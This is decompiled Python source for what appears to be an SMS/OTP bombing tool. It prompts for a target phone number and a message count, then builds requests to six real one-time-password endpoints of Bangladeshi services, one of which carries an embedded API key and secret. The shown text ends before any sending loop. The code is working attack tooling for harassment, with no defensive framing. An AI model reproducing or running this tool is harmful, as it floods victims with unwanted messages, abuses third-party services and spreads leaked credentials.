# Source Generated with Decompyle++
# File: rexm.pyc (Python 3.10)

import requests
from requests.structures import CaseInsensitiveDict
import os
import sys
import time
os.system('pip install requests')
os.system('clear')
red = '\x1b[0;31m'
yellow = '\x1b[0;33m'
green = '\x1b[0;32m'
color_off = '\x1b[0m'
bblack = '\x1b[1;30m'
bred = '\x1b[1;31m'
ured = '\x1b[4;31m'
on_green = '\x1b[42m'
lightblue = '\x1b[94m'
red = '\x1b[91m'
white = '\x1b[97m'
yellow = '\x1b[93m'
green = '\x1b[1;32m'
cyan = '\x1b[96m'
end = '\x1b[0m'
purple = '\x1b[0;35m'
on_green = '\x1b[42m'
os.system('clear')
os.system('lolcat target.txt')
print(' ')
print(' ')
number = str(input(yellow + '[➙] Enter Terget Number : '))
amount = int(input(cyan + '[➙] Enter Amount Limits : '))
url1 = 'https://ss.binge.buzz/otp/send/login'
headers1 = CaseInsensitiveDict()
headers1['Content-Type'] = 'application/x-www-form-urlencoded'
data1 = 'phone=' + number
url2 = 'https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88' + number + '&platform=app&activity=login'
headers2 = CaseInsensitiveDict()
headers2['Content-Type'] = 'application/json'
headers2['Content-Length'] = '0'
url3 = 'https://stage.bioscopelive.com/en/login/send-otp?phone=88' + number + '&operator=bd-otp'
url4 = 'https://redx.com.bd/registration/'
headers4 = CaseInsensitiveDict()
headers4['Content-Type'] = 'application/json'
data4 = '{"mobile":"' + number + '"}'
url5 = 'https://addabaji.mobi/twocups-v1-robi/otp.php'
headers5 = CaseInsensitiveDict()
headers5['Content-Type'] = 'application/x-www-form-urlencoded'
data5 = 'msisdn=' + number
url6 = 'https://developer.quizgiri.xyz/api/v2.0/send-otp'
headers6 = CaseInsensitiveDict()
headers6['Content-Type'] = 'application/json'
data6 = '{"phone":"' + number + '","country_code":"+880","fcm_token":null}'
